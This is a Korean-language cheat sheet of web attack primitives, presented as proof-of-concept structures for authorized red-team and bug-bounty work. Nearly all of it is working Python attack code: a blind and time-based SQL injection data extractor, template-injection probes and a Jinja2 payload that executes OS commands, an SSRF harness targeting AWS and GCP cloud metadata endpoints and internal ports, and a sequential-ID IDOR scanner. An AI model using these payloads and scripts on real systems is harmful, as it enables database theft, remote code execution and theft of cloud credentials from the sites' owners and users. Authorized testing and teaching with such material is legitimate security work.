# 웹 공격 프리미티브 (검증된 PoC 구조)

허가된 레드팀/버그바운티 실습 전제. 각 스니펫은 올바른 오라클·payload 배선을 보여주는 레퍼런스 구조.

## 블라인드 부울 SQLi — 본문 마커 오라클 + 이진 탐색
```python
import requests

TRUE_MARKER = "Welcome"   # 사전 캘리브레이션: '1 AND 1=1' vs '1 AND 1=2' 응답 차이로 결정

def is_true(sess: requests.Session, url: str, param: str, base: str, cond: str) -> bool:
    payload = f"{base} AND ({cond})"          # base=원래값(예 "1" 또는 따옴표컨텍스트 "1'")
    r = sess.get(url, params={param: payload}, timeout=10)
    return TRUE_MARKER in r.text               # 상태코드 아님 — 참/거짓 둘 다 200일 수 있음

def extract(sess, url, param, base, expr: str, max_len: int = 64) -> str:
    out = ""
    for pos in range(1, max_len + 1):
        if not is_true(sess, url, param, base, f"LENGTH(({expr}))>={pos}"):
            break
        lo, hi = 32, 126
        while lo < hi:                          # 문자당 ~7요청 (선형 95 대비)
            mid = (lo + hi) // 2
            if is_true(sess, url, param, base, f"ASCII(SUBSTRING(({expr}),{pos},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        out += chr(lo)
    return out

# 사용: extract(sess, "http://t/item", "id", "1", "SELECT VERSION()")
```

## 시간 기반 블라인드 SQLi (응답 지연 오라클)
```python
import requests

def time_true(sess: requests.Session, url: str, param: str, base: str, cond: str, sleep: int = 3) -> bool:
    payload = f"{base} AND IF(({cond}),SLEEP({sleep}),0)"   # MySQL. PG: CASE WHEN .. pg_sleep
    r = sess.get(url, params={param: payload}, timeout=sleep + 10)
    return r.elapsed.total_seconds() >= sleep               # 지연되면 조건 참
```

## SSTI 탐지 payload + Jinja2 식별
```python
# 템플릿 엔진별 탐지 payload (반사 결과로 엔진 식별)
SSTI_PROBES = {
    "generic": "${{7*7}}",      # 49 반사 → 평가됨
    "jinja2":  "{{7*'7'}}",     # 7777777 → Jinja2/Twig
    "jinja2_config": "{{config}}",
    "erb":     "<%= 7*7 %>",
    "freemarker": "${7*7}",
}

def detect_ssti(responses: dict[str, str]) -> list[str]:
    """probe 라벨 -> 응답본문 매핑에서 평가흔적 탐지."""
    hits = []
    if "49" in responses.get("generic", ""):
        hits.append("expression-eval")
    if "7777777" in responses.get("jinja2", ""):
        hits.append("jinja2/twig")
    return hits
```

## Jinja2 SSTI → RCE payload 문자열 (식별 후 사용)
```python
# {{config}} 노출 확인 뒤, 다음 체인으로 OS 명령 평가 (레퍼런스 payload)
JINJA2_RCE = (
    "{{ cycler.__init__.__globals__.os.popen('id').read() }}"
)
JINJA2_RCE_SUBCLASSES = (
    "{{ ''.__class__.__mro__[1].__subclasses__() }}"   # subprocess.Popen 인덱스 탐색용
)
payloads = [JINJA2_RCE, JINJA2_RCE_SUBCLASSES]
```

## SSRF 테스트 하네스 (클라우드 메타데이터 엔드포인트)
```python
import requests

SSRF_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",              # AWS IMDSv1
    "http://169.254.169.254/latest/api/token",               # AWS IMDSv2 (PUT 필요)
    "http://metadata.google.internal/computeMetadata/v1/",   # GCP (Metadata-Flavor 헤더)
    "http://127.0.0.1:22", "http://localhost:6379",          # 내부 포트
]

def probe_ssrf(sess: requests.Session, vuln_url: str, param: str) -> list[tuple[str, int]]:
    out = []
    for t in SSRF_TARGETS:
        try:
            r = sess.get(vuln_url, params={param: t}, timeout=8)
            out.append((t, r.status_code))
        except requests.RequestException:
            out.append((t, -1))
    return out
```

## IDOR 열거 (순차 ID 스캔, 접근 성공 탐지)
```python
import requests

def idor_scan(sess: requests.Session, url_tmpl: str, start: int, end: int, own_marker: str) -> list[int]:
    """url_tmpl 예: 'http://t/api/user/{}'. own_marker=권한없는 응답에 없어야 할 문자열."""
    accessible = []
    for i in range(start, end + 1):
        r = sess.get(url_tmpl.format(i), timeout=8)
        if r.status_code == 200 and own_marker in r.text:
            accessible.append(i)
    return accessible
```
